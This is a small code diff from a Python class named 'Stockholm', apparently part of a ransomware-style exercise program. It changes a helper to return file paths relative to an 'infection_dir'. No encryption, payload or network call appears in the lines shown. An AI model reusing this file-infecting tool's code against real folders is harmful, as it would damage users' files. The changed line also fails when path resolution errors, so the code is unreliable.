@@ -79,7 +79,7 @@ class Stockholm():
             relative = path.relative_to(self.infection_dir)
         except Exception as err:
             pass
-        return path
+        return relative
 
     def change_file(self, path: Path, new_path: Path):
         data: bytes = b""
